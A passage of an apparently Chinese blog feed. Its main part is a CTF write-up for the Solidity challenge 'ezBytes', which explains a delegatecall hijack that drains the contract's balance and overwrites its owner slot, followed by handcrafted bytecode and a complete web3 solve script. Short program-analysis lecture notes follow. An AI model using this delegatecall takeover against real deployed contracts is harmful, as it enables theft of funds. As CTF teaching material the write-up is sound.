if(msg.sender != i_owner) &#123; require(false); &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function challenge(address _yourContractAdd) public payable&#123;</span><br><span class="line"></span><br><span class="line">        uint256 size;</span><br><span class="line">        bytes memory your_code;</span><br><span class="line"></span><br><span class="line">        assembly&#123;//动态获取给定合约地址 _yourContractAdd 的代码，然后将其复制到以 mload(0x40) 为起始位置的内存中，后面的三行主要是为了保证size</span><br><span class="line">            size := extcodesize(_yourContractAdd)</span><br><span class="line">            your_code := mload(0x40)</span><br><span class="line">            mstore(0x40, add(your_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))//保证是32字节的倍数</span><br><span class="line">            mstore(your_code, size)</span><br><span class="line">            extcodecopy(_yourContractAdd, add(your_code, 0x20), 0, size)//从目标合约的开头复制size大小的字节到内存中</span><br><span class="line">        &#125;</span><br><span class="line">        for(uint256 i = 0; i &lt; your_code.length; i++) &#123;</span><br><span class="line">            require(int(uint8(your_code[i])) != 0xff,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) != 0xf5,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) != 0x01,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) % 2 == 1 || int(uint8(your_code[i])) == 0 );</span><br><span class="line">        &#125;</span><br><span class="line">        (bool success, ) = _yourContractAdd.delegatecall(&quot;&quot;);</span><br><span class="line">        require(success,&quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function check() public view returns(bool)&#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function changePassword(bytes32 str)onlyOwner payable public&#123;//</span><br><span class="line">        password=str;</span><br><span class="line">    &#125;</span><br><span class="line">    function checkPassword() public view returns (bool)&#123;</span><br><span class="line">        return password==&quot;22222222222222&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        bool flag1=check();</span><br><span class="line">        require(flag1,&quot;Oops, there is still a balance in the contract account.&quot;);</span><br><span class="line">        bool flag2=checkPassword();</span><br><span class="line">        require(flag2,&quot;Password is wrong.&quot;);</span><br><span class="line">        return flag1&amp;&amp;flag2 ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>首先看到最终需要让其返回true的isSolved函数总共需要解决两个条件</p><ul><li>盗取合约内的所有balance（余额）</li><li>修改password（changePassword函数只有合约所有者才可以执行）</li></ul><p>很明显看到challenge函数有合约地址可控的delegatecall调用</p><h3 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>delegatecall调用很容易可以联想到委托调用漏洞，delegatecall的参数是函数的abi，简单来说只要delegatecall参数，及前面的addr都可控，就能实现当前合约执行任意合约的任意方法（相当于直接把那个函数插入到当前合约代码中直接执行）</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241807.png"                      alt="image-20231128213125822"                ><figcaption>image-20231128213125822</figcaption></figure></p><blockquote><p>可以看到上面A合约通过委托调用了B合约的方法修改了自身的属性</p><p>这里再加一个概念Slot，以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为 2^256 的超级数组中，数组中每个元素称为插槽</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 插槽式数组存储</span><br><span class="line">----------------------------------</span><br><span class="line">|               0                |     # slot 0</span><br><span class="line">----------------------------------</span><br><span class="line">|               1                |     # slot 1</span><br><span class="line">----------------------------------</span><br><span class="line">|               2                |     # slot 2</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # 每个插槽 32 字节</span><br><span class="line">----------------------------------</span><br><span class="line">|              ...               |     # ...</span><br><span class="line">----------------------------------</span><br><span class="line">|            2^256-1             |     # slot 2^256-1</span><br><span class="line">----------------------------------</span><br></pre></td></tr></table></figure></div><p>编译时将严格根据字段排序顺序(*)，从位置 0 开始连续放置在存储中。如果可能的话，大小少于 32 字节的多个变量会被打包到一个插槽中，而当某项数据超过 32 字节，则需要占用多个连续插槽</p><p>如下合约</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract C &#123;</span><br><span class="line"> address a;      // 0</span><br><span class="line"> uint8 b;        // 0</span><br><span class="line"> uint256 c;      // 1</span><br><span class="line"> bytes24 d;      // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>存储布局如下</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (11) | b (1) |            a (20)           | &lt;- slot 0</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">|                       c (32)                      | &lt;- slot 1</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">| unused (8) |                d (24)                | &lt;- slot 2</span><br><span class="line">-----------------------------------------------------</span><br></pre></td></tr></table></figure></div></blockquote><p>再看一下对于delegatecall调用的字节码的限制，题目合约中会先将目标合约的字节码先复制过来逐字节检查</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for(uint256 i = 0; i &lt; your_code.length; i++) &#123;</span><br><span class="line">    require(int(uint8(your_code[i])) != 0xff,&quot;Nop&quot;);</span><br><span class="line">    require(int(uint8(your_code[i])) != 0xf5,&quot;Nop&quot;);</span><br><span class="line">    require(int(uint8(your_code[i])) != 0x01,&quot;Nop&quot;);</span><br><span class="line">    require(int(uint8(your_code[i])) % 2 == 1 || int(uint8(your_code[i])) == 0 );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>限制了不能用</p><ul><li>0xff(自毁合约指令可以让合约自行销毁，并将账户中的ETH余额发送到指定地址)</li><li>0xf5(CREATE2,可以部署一个新合约并发送指定数量wei的ETH)</li><li>0x01(ADD)</li><li>所有偶数的Opcodes</li><li>0x00(STOP)</li></ul></blockquote><h3 id="盗取合约内余额"><a href="#盗取合约内余额" class="headerlink" title="盗取合约内余额"></a>盗取合约内余额</h3><h4 id="先介绍几个EVM-Opcode"><a href="#先介绍几个EVM-Opcode" class="headerlink" title="先介绍几个EVM Opcode"></a>先介绍几个EVM Opcode</h4><p>更多Opcode可以参考<a class="link"   href="https://www.evm.codes/?fork=shanghai" >https://www.evm.codes/?fork=shanghai <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li><p>SELFBALANCE：将合约余额压入栈中，单位为<code>wei</code></p></li><li><p>SSTORE：将栈顶的两个元素视为key和value(栈顶),将value赋值给第key个slot</p></li><li><p>CALL:创建一个子环境来执行其他合约的部分代码，发送<code>ETH</code>，并返回success(发送ETH是否成功)</p><p>CALL会从堆栈中弹出7个参数，依次为：</p><ul><li><code>gas</code>：为这次调用分配的gas量。</li><li><code>to</code>：被调用合约的地址。</li><li><code>value</code>：要发送的以太币数量，单位为<code>wei</code>。</li><li><code>mem_in_start</code>：输入数据（calldata）在内存的起始位置。</li><li><code>mem_in_size</code>：输入数据的长度。</li><li><code>mem_out_start</code>：返回数据（returnData）在内存的起始位置。</li><li><code>mem_out_size</code>：返回数据的长度。</li></ul></li></ul><p>可以构造7个栈输入使得合约余额全部转到某个地址，下面示例是直接转到0地址</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">SELFBALANCE</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">CALL</span><br></pre></td></tr></table></figure></div><blockquote><p>这里用PUSH2是因为限制不能用偶数的Opcode</p></blockquote><h3 id="修改合约所有者"><a href="#修改合约所有者" class="headerlink" title="修改合约所有者"></a>修改合约所有者</h3><p>由于源码中i_owner处于slot 0</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.2;</span><br><span class="line">contract ezBytes&#123;</span><br><span class="line">    address public  i_owner;</span><br><span class="line">    //...</span><br></pre></td></tr></table></figure></div><p>可以利用SSTORE以及CALLER，把调用合约的合约地址（我们自身）赋值给slot 0</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CALLER           //把调用者地址压入栈 </span><br><span class="line">PUSH2 0x0000     // 将0x0000压入栈</span><br><span class="line">SSTORE           // 存储数据到状态变量</span><br></pre></td></tr></table></figure></div><p>综合一下总体的字节码</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">SELFBALANCE</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">PUSH2 0x0000</span><br><span class="line">CALL</span><br></pre></td></tr></table></figure></div><p>最后需要加上常规的合约准备工作,把后面需要的25字节的字节码拷贝到内存，这25字节也是后续题目合约的内联汇编中通过extcodesize以及extcodecopy能接触到的字节码</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 0x19         // 将0x19压入栈</span><br><span class="line">DUP1              // 复制栈顶元素</span><br><span class="line">PUSH1 0x09         // 将0x09压入栈</span><br><span class="line">RETURNDATASIZE    // 获取上一个外部调用的返回数据的大小,防止覆盖</span><br><span class="line">CODECOPY          // 将合约代码拷贝到内存 </span><br><span class="line">RETURNDATASIZE    // 获取返回数据的大小</span><br><span class="line">F3  *RETURN           // 返回</span><br></pre></td></tr></table></figure></div><blockquote><p>这里其实就是把0x09后的25字节拷贝的内存中，而上面的准备部分刚好是9个字节</p><p>这一段是在合约部署的时候执行的</p></blockquote><h3 id="部署slover合约"><a href="#部署slover合约" class="headerlink" title="部署slover合约"></a>部署slover合约</h3><p>slover合约是一个工具人合约，用来被上面的字节码替换，部署的话得使用python脚本</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> solcx <span class="keyword">import</span> compile_files, install_solc</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPProvider:</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://43.143.170.225:20001&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span>(w3.is_connected())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_new_account</span>():</span><br><span class="line">    keys = w3.eth.account.create()</span><br><span class="line">    address = w3.to_checksum_address(keys.address)</span><br><span class="line">    privateKey = <span class="built_in">hex</span>(bytes_to_long(keys.key))</span><br><span class="line">    <span class="keyword">return</span> (address, privateKey)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">privateKey = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">account = w3.eth.account.from_key(privateKey)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;player_address: &#x27;</span> + account.address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_transaction</span>(<span class="params">account, func, args=(<span class="params"></span>)</span>):</span><br><span class="line">    nonce = w3.eth.get_transaction_count(account.address)</span><br><span class="line">    txn = func(*args).build_transaction(&#123;</span><br><span class="line">        <span class="string">&#x27;from&#x27;</span>: account.address,</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: nonce</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn = w3.eth.account.sign_transaction(txn, account.key)</span><br><span class="line">    txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line">    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)</span><br><span class="line">    <span class="keyword">return</span> txn_receipt</span><br><span class="line"></span><br><span class="line">install_solc(version=<span class="string">&quot;0.7.2&quot;</span>)</span><br><span class="line">compiled_sol = compile_files(<span class="string">&#x27;Chall.sol&#x27;</span>, output_values=[<span class="string">&#x27;abi&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>], solc_version=<span class="string">&quot;0.7.2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_address = <span class="string">&#x27;xxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">challenge_abi = compiled_sol[<span class="string">&#x27;Chall.sol:ezBytes&#x27;</span>][<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">challenge_contract = w3.eth.contract(address=challenge_address, abi=challenge_abi)</span><br><span class="line"></span><br><span class="line">contract_interface = compiled_sol[<span class="string">&#x27;Chall.sol:Solver&#x27;</span>]</span><br><span class="line">solver_abi = contract_interface[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">solver_bytecode = <span class="string">&#x27;60198060093d393df3610000610000610000610000473361000055610000610000f1&#x27;</span></span><br><span class="line">solver_contract = w3.eth.contract(abi=solver_abi, bytecode=solver_bytecode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Creating solver contract...&#x27;</span>)</span><br><span class="line">solver_address = send_transaction(account, solver_contract.constructor).contractAddress</span><br><span class="line"><span class="built_in">print</span>(solver_address)</span><br></pre></td></tr></table></figure></div><p>运行得到slover合约地址,可以使用Remix IDE直接调用challenge函数</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241555.png"                      alt="image-20231129023343884"                ><figcaption>image-20231129023343884</figcaption></figure></p><p>现在check函数已经返回了true，说吗合约内余额已清空，再查看合约所有者，也更改成当前账户</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241294.png"                      alt="image-20231129023536722"                ><figcaption>image-20231129023536722</figcaption></figure></p><p>现在已经可以调用changePassword来修改密码了,注意要输入16进制修饰，完整的32字节 0x3232323232323232323232323232000000000000000000000000000000000000</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241535.png"                      alt="image-20231129023719689"                ><figcaption>image-20231129023719689</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241783.png"                      alt="image-20231129023912725"                ><figcaption>image-20231129023912725</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241156.png"                      alt="image-20231129024003714"                ><figcaption>image-20231129024003714</figcaption></figure></p><h2 id="0x03-一把梭脚本"><a href="#0x03-一把梭脚本" class="headerlink" title="0x03 一把梭脚本"></a>0x03 一把梭脚本</h2><p>需要手动替换题目地址和私钥</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> solcx <span class="keyword">import</span> compile_files, install_solc</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># HTTPProvider:</span></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;http://43.143.170.225:20001&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span>(w3.is_connected())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_new_account</span>():</span><br><span class="line">    keys = w3.eth.account.create()</span><br><span class="line">    address = w3.to_checksum_address(keys.address)</span><br><span class="line">    privateKey = <span class="built_in">hex</span>(bytes_to_long(keys.key))</span><br><span class="line">    <span class="keyword">return</span> (address, privateKey)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">address, privateKey = create_new_account()</span></span><br><span class="line"><span class="string">print(privateKey)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">privateKey = <span class="string">&#x27;0x5bc768688b09f8df514db9f99214bc7ecf6c7772a7bb9a61e1d4430e621044a2&#x27;</span></span><br><span class="line">account = w3.eth.account.from_key(privateKey)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;player_address: &#x27;</span> + account.address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_transaction</span>(<span class="params">account, func, args=(<span class="params"></span>)</span>):</span><br><span class="line">    nonce = w3.eth.get_transaction_count(account.address)</span><br><span class="line">    txn = func(*args).build_transaction(&#123;</span><br><span class="line">        <span class="string">&#x27;from&#x27;</span>: account.address,</span><br><span class="line">        <span class="string">&quot;gasPrice&quot;</span>: w3.eth.gas_price,</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: nonce</span><br><span class="line">    &#125;)</span><br><span class="line">    signed_txn = w3.eth.account.sign_transaction(txn, account.key)</span><br><span class="line">    txn_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)</span><br><span class="line">    txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)</span><br><span class="line">    <span class="keyword">return</span> txn_receipt</span><br><span class="line"></span><br><span class="line">install_solc(version=<span class="string">&quot;0.7.2&quot;</span>)</span><br><span class="line">compiled_sol = compile_files(<span class="string">&#x27;Chall.sol&#x27;</span>, output_values=[<span class="string">&#x27;abi&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>], solc_version=<span class="string">&quot;0.7.2&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">challenge_address = <span class="string">&#x27;0x7E289572f980aA581d5811cEA39e5dC9fc182e79&#x27;</span></span><br><span class="line">challenge_abi = compiled_sol[<span class="string">&#x27;Chall.sol:ezBytes&#x27;</span>][<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">challenge_contract = w3.eth.contract(address=challenge_address, abi=challenge_abi)</span><br><span class="line"><span class="comment">#if challenge_contract.functions.isSolved().call():</span></span><br><span class="line"><span class="comment">#    print(&#x27;Already solved.&#x27;)</span></span><br><span class="line"><span class="comment">#    exit(0)</span></span><br><span class="line"></span><br><span class="line">contract_interface = compiled_sol[<span class="string">&#x27;Chall.sol:Solver&#x27;</span>]</span><br><span class="line">solver_abi = contract_interface[<span class="string">&#x27;abi&#x27;</span>]</span><br><span class="line">solver_bytecode = <span class="string">&#x27;60198060093d393df3610000610000610000610000473361000055610000610000f1&#x27;</span></span><br><span class="line">solver_contract = w3.eth.contract(abi=solver_abi, bytecode=solver_bytecode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Creating solver contract...&#x27;</span>)</span><br><span class="line">solver_address = send_transaction(account, solver_contract.constructor).contractAddress</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Done, solver_address: &#x27;</span> + solver_address)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Solving...&#x27;</span>)</span><br><span class="line">send_transaction(account, challenge_contract.functions.challenge, (solver_address, ))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> challenge_contract.functions.check().call():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Solved&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">send_transaction(account, challenge_contract.functions.changePassword, (<span class="string">&quot;0x3232323232323232323232323232000000000000000000000000000000000000&quot;</span>, ))</span><br><span class="line"><span class="keyword">if</span> challenge_contract.functions.isSolved().call():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Success&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No&#x27;</span>)</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> ETH </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件分析-过程间分析</title>
      <link href="/2023/09/23/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
      <url>/2023/09/23/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="过程间分析"><a href="#过程间分析" class="headerlink" title="过程间分析"></a>过程间分析</h1><h2 id="寻找可能被调用的方法"><a href="#寻找可能被调用的方法" class="headerlink" title="寻找可能被调用的方法"></a>寻找可能被调用的方法</h2><p>Dispatch(c,m) c是类，m是方法</p><blockquote><p>两种返回值</p><ul><li>c.m</li><li>c’.m(c’是c的父类，当然如果这个父类也没有method方法，还会继续往上找父类的父类)</li></ul></blockquote><p>special call对应唯一方法，virtual call会调用dispatch</p><h3 id="Resolve-cs"><a href="#Resolve-cs" class="headerlink" title="Resolve(cs)"></a>Resolve(cs)</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162156090.png"                      alt="image-20231017185458682"                ><figcaption>image-20231017185458682</figcaption></figure></p><blockquote><p>比较tricky的virtual，对c和c的所有子类都采用dispatch，子类包括直接子类和间接子类，所以会一直延伸到树的叶子结点</p><p>java编译出的字节码可以判断这三种call方法</p></blockquote><h2 id="CHA"><a href="#CHA" class="headerlink" title="CHA"></a>CHA</h2><p>举个🌰</p><p>c没有子类，所以就返回自己的foo方法</p><p>a自己有foo会返回，再往下还会找子类的foo，所以cd也加进去了</p><p>b自己没有foo，但其父类A有foo，所以dispatch(b,foo)会返回A.foo()，且子类C、D的也会加进去</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162156587.png"                      alt="image-20231017190308693"                ><figcaption>image-20231017190308693</figcaption></figure></p><blockquote><p>暴露的漏洞，当规定了b就是B对象时调用b.foo()时其实不会调用C.foo(),D.foo()</p><p>所以CHA不太准</p></blockquote><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>快速：只看继承树</p><p>不准</p><blockquote><p>应用场景：ide函数方法提示</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162156601.png"                      alt="image-20231017192938184"                ><figcaption>image-20231017192938184</figcaption></figure></p></blockquote><h2 id="调用图"><a href="#调用图" class="headerlink" title="调用图"></a>调用图</h2><p>有向图</p><h3 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h3><p><strong><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162156885.png"                      alt="image-20231017193319093"                ><figcaption>image-20231017193319093</figcaption></figure></strong></p><blockquote><p>RM：存储可达方法</p><p>WL：存储方法</p><p>CG：调用图</p></blockquote><h2 id="过程间控制流图–ICFG"><a href="#过程间控制流图–ICFG" class="headerlink" title="过程间控制流图–ICFG"></a>过程间控制流图–ICFG</h2><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162156700.png"                      alt="image-20231017194814707"                ><figcaption>image-20231017194814707</figcaption></figure></p><h2 id="过程间数据流分析"><a href="#过程间数据流分析" class="headerlink" title="过程间数据流分析"></a>过程间数据流分析</h2><h3 id="常量传播"><a href="#常量传播" class="headerlink" title="常量传播"></a>常量传播</h3><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407162157872.png"                      alt="image-20231017201825006"                ><figcaption>image-20231017201825006</figcaption></figure></p><blockquote><p>与之前类似，常量有重定义的情况会kill掉（比如b&#x3D;ten()那里）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> program analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件分析-数据流分析</title>
      <link href="/2023/09/17/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
      <url>/2023/09/17/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/</url>
      
